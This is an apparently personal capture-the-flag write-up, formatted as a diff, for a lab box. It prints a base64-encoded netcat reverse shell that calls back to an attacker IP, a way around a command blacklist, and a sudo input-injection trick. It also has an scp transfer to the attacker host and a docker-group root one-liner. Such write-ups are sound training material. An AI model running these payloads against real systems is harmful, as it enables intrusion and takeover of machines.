@@ -1,0 +1,53 @@
+although this room was marked as easy, it is not comparable to other easy rooms on the platform
+
+1. enumeration 
+
+nmap showed ports 21, 22, 80 open, with not much more to it - ftp allowed anonymous login and revealed a note on some commands being filtered on the site
+
+http showed a basic blog site, after running feroxbuster i found a /secret directory, which included a php script that allowed to run some commands on host
+
+after playing with the script, i revealed the source code of the site by enumerating the directory using `file *` (ls was blacklisted), and revealing the sourcecode of index.php using `tac index.php` (cat was also blacklisted, together with stuff like nc, python, ruby, php, etc.) 
+
+the clue to the script was single quotes, so final payload looked like this:
+
+`echo“cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjE4LjExMi41MCA5OTk5ID4vdG1wL2Y=" | base64 -d | ‘sh’`
+
+this allowed me to grab a foothold and a shell 
+
+after enumeration of the box, after running `sudo -l` i revealed a script in one of the users directory that can be run with as the user with sudo without providing a password
+
+the script used read arguments using `read -p` without sanitizing the input, which allowed me to run commands as the user, resulting in getting a shell by inputting `sh` 
+
+i stabilized the shell using `python3 -c 'import pty;pty.spawn("/bin/bash")'` 
+
+after enumerating the web files and finding a different directory in `/var/www/` other than html, i found credentials for a mysql service, which i confirmed was running using 
+
+`netstat -ano | grep mysql`
+
+this allowed me to log into the database, enumerate, find user md5 hashes and cracked them, but this proved to be no useful 
+
+another interesting files other than source codes (with credentials) were .jpg and .gif files, which i transferred using secure copy:
+
+`scp *file1 file1* kali@attackerip:/home/kali/Desktop/workspace/chillhack`
+
+after running
+
+`sudo systemctl start ssh.socket`
+
+on attacker box i ran 
+
+`steghide -extract -sf file1`
+
+this extracted a *backup.zip* file secured by a password which was cracked using
+
+`zip2john backup.zip` 
+
+password was pass1word, this allowed me to discover a source_code.php file, which contained a login script with a md5 hash used for authentication 
+
+the password turned out to be a ssh password for one of the other users on the box
+
+privilege escalation was ran through the second discovered user with a simple oneliner found on GTFO bins, after discovering that the user was part of a docker group:
+
+`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
+
+this concluded the box
